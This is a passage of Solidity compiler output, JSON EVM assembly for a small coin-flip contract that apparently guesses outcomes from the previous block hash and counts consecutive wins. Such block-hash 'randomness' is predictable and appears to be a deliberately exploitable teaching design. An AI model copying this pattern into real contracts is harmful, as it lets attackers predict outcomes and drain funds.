									".auxdata": "a2646970667358221220600c01c94b94dccd9b2d13cb809818dbacf42bbd2b43e8676a47093f835e081e64736f6c634300081b0033",
									".code": [
										{
											"begin": 58,
											"end": 796,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 58,
											"end": 796,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 58,
											"end": 796,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 58,
											"end": 796,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 58,
											"end": 796,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 58,
											"end": 796,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 58,
											"end": 796,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 58,
											"end": 796,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 58,
											"end": 796,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 58,
											"end": 796,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 58,
											"end": 796,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F67"
										},
										{
											"begin": 58,
											"end": 796,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 58,
											"end": 796,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "PUSH",
											"source": 0,
											"value": "E6F334D7"
										},
										{
											"begin": 58,
											"end": 796,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 58,
											"end": 796,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 58,
											"end": 796,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 58,
											"end": 796,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 58,
											"end": 796,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 58,
											"end": 796,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 297,
											"end": 794,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 297,
											"end": 794,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 297,
											"end": 794,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 297,
											"end": 794,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 297,
											"end": 794,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 297,
											"end": 794,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 297,
											"end": 794,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 297,
											"end": 794,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 297,
											"end": 794,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 297,
											"end": 794,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 297,
											"end": 794,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 297,
											"end": 794,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 297,
											"end": 794,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 82,
											"end": 112,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 82,
											"end": 112,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 82,
											"end": 112,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 82,
											"end": 112,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 82,
											"end": 112,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 82,
											"end": 112,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 82,
											"end": 112,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 82,
											"end": 112,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 82,
											"end": 112,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 297,
											"end": 794,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 340,
											"end": 344,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 356,
											"end": 374,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 410,
											"end": 411,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 395,
											"end": 407,
											"name": "NUMBER",
											"source": 0
										},
										{
											"begin": 395,
											"end": 411,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 395,
											"end": 411,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 395,
											"end": 411,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 395,
											"end": 411,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 395,
											"end": 411,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 395,
											"end": 411,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 395,
											"end": 411,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 385,
											"end": 412,
											"name": "BLOCKHASH",
											"source": 0
										},
										{
											"begin": 377,
											"end": 413,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 377,
											"end": 413,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 356,
											"end": 413,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 356,
											"end": 413,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 440,
											"end": 450,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 428,
											"end": 436,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 428,
											"end": 436,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 428,
											"end": 450,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 424,
											"end": 485,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 424,
											"end": 485,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 466,
											"end": 474,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 466,
											"end": 474,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 466,
											"end": 474,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 424,
											"end": 485,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 424,
											"end": 485,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 506,
											"end": 516,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 495,
											"end": 503,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 495,
											"end": 516,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 495,
											"end": 516,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 495,
											"end": 516,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 495,
											"end": 516,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 526,
											"end": 542,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 558,
											"end": 564,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 558,
											"end": 564,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 545,
											"end": 555,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 545,
											"end": 564,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 545,
											"end": 564,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 545,
											"end": 564,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 545,
											"end": 564,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 545,
											"end": 564,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 545,
											"end": 564,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 545,
											"end": 564,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 526,
											"end": 564,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 526,
											"end": 564,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 574,
											"end": 583,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 598,
											"end": 599,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 586,
											"end": 594,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 586,
											"end": 599,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 586,
											"end": 614,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 586,
											"end": 614,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 609,
											"end": 614,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 586,
											"end": 614,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 586,
											"end": 614,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 586,
											"end": 614,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 586,
											"end": 614,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 602,
											"end": 606,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 586,
											"end": 614,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 586,
											"end": 614,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 574,
											"end": 614,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 574,
											"end": 614,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 637,
											"end": 643,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 629,
											"end": 643,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 629,
											"end": 643,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 629,
											"end": 633,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 629,
											"end": 643,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 629,
											"end": 643,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 629,
											"end": 643,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 625,
											"end": 788,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 625,
											"end": 788,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 659,
											"end": 674,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 659,
											"end": 674,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 659,
											"end": 676,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 659,
											"end": 676,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 659,
											"end": 676,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 659,
											"end": 676,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 659,
											"end": 676,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 659,
											"end": 676,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 659,
											"end": 676,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 659,
											"end": 676,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 659,
											"end": 676,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 659,
											"end": 676,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 659,
											"end": 676,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 659,
											"end": 676,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 659,
											"end": 676,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 659,
											"end": 676,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 659,
											"end": 676,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 659,
											"end": 676,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 659,
											"end": 676,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 697,
											"end": 701,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 690,
											"end": 701,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 690,
											"end": 701,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 690,
											"end": 701,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 690,
											"end": 701,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 690,
											"end": 701,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 690,
											"end": 701,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 690,
											"end": 701,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 625,
											"end": 788,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 625,
											"end": 788,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 750,
											"end": 751,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 732,
											"end": 747,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 732,
											"end": 751,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 732,
											"end": 751,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 732,
											"end": 751,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 732,
											"end": 751,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 772,
											"end": 777,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 765,
											"end": 777,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 765,
											"end": 777,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 765,
											"end": 777,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 765,
											"end": 777,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 765,
											"end": 777,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 297,
											"end": 794,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 297,
											"end": 794,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 82,
											"end": 112,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 82,
											"end": 112,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 82,
											"end": 112,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 88,
											"end": 205,
											"name": "tag",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 88,
											"end": 205,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 197,
											"end": 198,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 194,
											"end": 195,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 187,
											"end": 199,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 334,
											"end": 424,
											"name": "tag",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 334,
											"end": 424,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 368,
											"end": 375,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 411,
											"end": 416,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 404,
											"end": 417,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 397,
											"end": 418,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 386,
											"end": 418,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 386,
											"end": 418,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 334,
											"end": 424,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 334,
											"end": 424,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 334,
											"end": 424,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 334,
											"end": 424,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 430,
											"end": 546,
											"name": "tag",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 430,
											"end": 546,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 500,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 515,
											"end": 520,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 500,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 500,
											"end": 521,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 500,
											"end": 521,
											"name": "tag",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 500,
											"end": 521,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 493,
											"end": 498,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 490,
											"end": 522,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 480,
											"end": 540,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 480,
											"end": 540,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 536,
											"end": 537,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 533,
											"end": 534,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 526,
											"end": 538,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 480,
											"end": 540,
											"name": "tag",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 480,
											"end": 540,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 430,
											"end": 546,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 430,
											"end": 546,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 552,
											"end": 685,
											"name": "tag",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 552,
											"end": 685,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 595,
											"end": 600,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 633,
											"end": 639,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 620,
											"end": 640,
											"name": "CALLDATALOAD",
											"source": 2
										},
										{
											"begin": 611,
											"end": 640,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 611,
											"end": 640,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 649,
											"end": 679,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 673,
											"end": 678,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 649,
											"end": 679,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 649,
											"end": 679,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 649,
											"end": 679,
											"name": "tag",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 649,
											"end": 679,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 552,
											"end": 685,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 552,
											"end": 685,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 552,
											"end": 685,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 552,
											"end": 685,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 552,
											"end": 685,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "tag",
											"source": 2,
											"value": "7"
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 747,
											"end": 753,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 796,
											"end": 798,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 784,
											"end": 793,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 775,
											"end": 782,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 771,
											"end": 794,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 767,
											"end": 799,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 764,
											"end": 883,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 764,
											"end": 883,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 764,
											"end": 883,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 802,
											"end": 881,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 802,
											"end": 881,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 802,
											"end": 881,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 802,
											"end": 881,
											"name": "tag",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 802,
											"end": 881,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 764,
											"end": 883,
											"name": "tag",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 764,
											"end": 883,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 922,
											"end": 923,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 947,
											"end": 997,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "51"
										},
										{
											"begin": 989,
											"end": 996,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 980,
											"end": 986,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 969,
											"end": 978,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 965,
											"end": 987,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 947,
											"end": 997,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 947,
											"end": 997,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 947,
											"end": 997,
											"name": "tag",
											"source": 2,
											"value": "51"
										},
										{
											"begin": 947,
											"end": 997,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 937,
											"end": 997,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 937,
											"end": 997,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 893,
											"end": 1007,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 691,
											"end": 1014,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1020,
											"end": 1129,
											"name": "tag",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 1020,
											"end": 1129,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1101,
											"end": 1122,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "53"
										},
										{
											"begin": 1116,
											"end": 1121,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1101,
											"end": 1122,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 1101,
											"end": 1122,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1101,
											"end": 1122,
											"name": "tag",
											"source": 2,
											"value": "53"
										},
										{
											"begin": 1101,
											"end": 1122,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1096,
											"end": 1099,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1089,
											"end": 1123,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1020,
											"end": 1129,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1020,
											"end": 1129,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1020,
											"end": 1129,
